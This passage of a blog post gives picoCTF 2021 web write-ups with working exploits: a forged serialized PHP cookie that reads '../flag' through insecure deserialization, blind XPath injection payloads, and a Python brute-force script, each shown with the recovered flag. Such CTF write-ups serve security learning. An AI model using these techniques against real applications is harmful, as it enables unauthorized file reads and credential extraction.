        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$perm</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">catch</span><span class="token punctuation">(</span>Error <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Deserialization error. "</span><span class="token punctuation">.</span><span class="token variable">$perm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>然后还有<code>authentication.php</code>，老办法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name">access_log</span>
<span class="token punctuation">&#123;</span>
        <span class="token keyword">public</span> <span class="token variable">$log_file</span><span class="token punctuation">;</span>

        <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$lf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span> <span class="token operator">=</span> <span class="token variable">$lf</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">function</span> <span class="token function">append_to_log</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">function</span> <span class="token function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"cookie.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$perm</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$perm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Welcome admin"</span><span class="token punctuation">;</span>
        <span class="token variable">$log</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">access_log</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"access.log"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$log</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">append_to_log</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Logged in at "</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Y-m-d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"Welcome guest"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>

<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>style.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>row<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>col-sm-9 col-md-7 col-lg-5 mx-auto<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card card-signin my-5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-body<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                                                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>card-title text-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token variable">$msg</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">></span></span>
                                                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                                                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>btn btn-lg btn-primary btn-block text-uppercase<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>document.cookie=<span class="token punctuation">'</span>user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Go back to login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
                                                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
                                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>看到了反序列化。梳理一下代码逻辑</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//首先是这里读取文件，结合hint：The flag is at ../flag。所以这里是最后的getflag的地方，要想办法执行到这里。</span>
<span class="token keyword">function</span> <span class="token function">append_to_log</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//然后需要执行到authentication.php，就需要这里</span>
<span class="token variable">$perm_res</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">permissions</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token variable">$perm_res</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"login"</span><span class="token punctuation">,</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token number">86400</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: authentication.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//perm_res实例化一个对象，该类在cookie.php中。</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$perm</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_guest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$perm</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">catch</span><span class="token punctuation">(</span>Error <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Deserialization error. "</span><span class="token punctuation">.</span><span class="token variable">$perm</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//执行过</span>
<span class="token comment">//执行到这里，才算是完全将整个逻辑梳理下来</span>
<span class="token comment">//perm_res——>cookie::login——>authentication.php::read_log()——>捕获Error</span></code></pre>

<p>POC构造</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">access_log</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$log_file</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$lf</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span> <span class="token operator">=</span> <span class="token variable">$lf</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">append_to_log</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">FILE_APPEND</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">function</span> <span class="token function">read_log</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">log_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$perm_res</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">access_log</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"../flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$perm_res_encoded</span> <span class="token operator">=</span>  <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$perm_res</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$perm_res_encoded</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
//TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9</code></pre>

<p>exp</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>
└─<span class="token comment"># curl http://mercury.picoctf.net:2148/authentication.php -H "Cookie: login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9;"</span>
Deserialization error. picoCTF<span class="token punctuation">&#123;</span>th15_vu1n_1s_5up3r_53r1ous_y4ll_8db8f85c<span class="token punctuation">&#125;</span></code></pre>

<h1 id="X-marks-the-spot"><a href="#X-marks-the-spot" class="headerlink" title="X marks the spot"></a>X marks the spot</h1><p>XPATH注入<br>学习参考<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection">XPATH Injection</a><br>盲注字符串长度</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">and</span> string<span class="token operator">-</span><span class="token function">length</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token operator">=</span><span class="token constant">SIZE_INT</span></code></pre>

<p>逐个猜测每一个字母</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token function">substring</span><span class="token punctuation">(</span><span class="token comment">//user[userid=5]/username,2,1)=CHAR_HERE</span>
<span class="token function">substring</span><span class="token punctuation">(</span><span class="token comment">//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)</span></code></pre>


<p>尝试注入</p>
<pre class="language-xml" data-language="xml"><code class="language-xml">' or string-length(//user[position()=1]/pass)>1 or 'a'='</code></pre>

<p>这个是测试flag的长度是否大于1，如果是应该返回正确的。<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210808224822301.png" alt="image-20210808224822301" loading="lazy"></p>
<p>由此，写出脚本</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> string
<span class="token keyword">import</span> urllib

user_id <span class="token operator">=</span> <span class="token number">3</span>
password <span class="token operator">=</span> <span class="token string">""</span>

<span class="token keyword">with</span> log<span class="token punctuation">.</span>progress<span class="token punctuation">(</span><span class="token string">'Brute-forcing password'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> p<span class="token punctuation">:</span>
    index <span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">while</span> <span class="token keyword">not</span> password<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> c <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> <span class="token string">"&#123;&#125;_"</span>  <span class="token operator">+</span> string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>
            p<span class="token punctuation">.</span>status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Index: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">, known password: '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">', trying: '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">'"</span></span><span class="token punctuation">)</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://mercury.picoctf.net:16521/"</span><span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"' or substring(//user[position()=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>user_id<span class="token punctuation">&#125;</span></span><span class="token string">]/pass,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">,1)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>c<span class="token punctuation">&#125;</span></span><span class="token string">' or 'a'='"</span></span><span class="token punctuation">,</span> <span class="token string">"pass"</span><span class="token punctuation">:</span> <span class="token string">"test"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token string">"right"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                password <span class="token operator">+=</span> c
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Can't find character for index </span><span class="token interpolation"><span class="token punctuation">&#123;</span>index<span class="token punctuation">&#125;</span></span><span class="token string">!"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">break</span>

        index <span class="token operator">+=</span> <span class="token number">1</span>
        
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Password: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token comment">#output</span>
<span class="token comment">#[+] Brute-forcing password: Done</span>
<span class="token comment">#Password: picoCTF&#123;h0p3fully_u_t0ok_th3_r1ght_xp4th_f0505d9c&#125;</span></code></pre>

<h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>发现这些题目都很有意思，能学到很多内容，确实比起国内的层层套娃的题目质量好很多。</p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me a candy.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg"><img loading="lazy" src="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>m0re</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://m0re.top/posts/3246d33f/" title="PicoCTF2021_Web(二)">https://m0re.top/posts/3246d33f/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> 许可协议。</li></ul></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/9d77485d/" rel="next" title="PicoCTF2021_Web(一)"><span class="post-nav-text">PicoCTF2021_Web(一)</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>尝试使用 utterances （基于 GitHub Issues）评论系统。</span><br><span>您可以点击下方按钮切换对应评论系统，</span><br><span><script>function showUtterances(){ document.querySelector(".utterances").style.display='block'; document.querySelector('#valine-container').style.display='none'; }function showValine(){ document.querySelector('#valine-container').style.display='block'; document.querySelector(".utterances").style.display='none'; }</script></span><br><span><a class="hty-button hty-button--raised" onclick="showValine()">Valine</a><a class="hty-button hty-button--raised" onclick="showUtterances()">utterances</a></span><br><span><style>.utterances{display:none;}</style></span><br></div><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
  const valineConfig = {"enable":true,"appId":"gUEA9zKLhCnMFxQI5kI20WiD-gzGzoHsz","appKey":"GQKAp04LNloy3MrDMv86MI3i","placeholder":"评论一下~&nbsp_(:з」∠)_ （填写邮箱可以收到回复通知～）","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"requiredFields":["nick","mail"],"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = "/posts/3246d33f/"
  new Valine(valineConfig)
}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">豫ICP备2020025591号-1</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> m0re</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.1.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.1</span></div><div class="live_time"><span>本博客已苟延残喘了</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2020-02-21T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
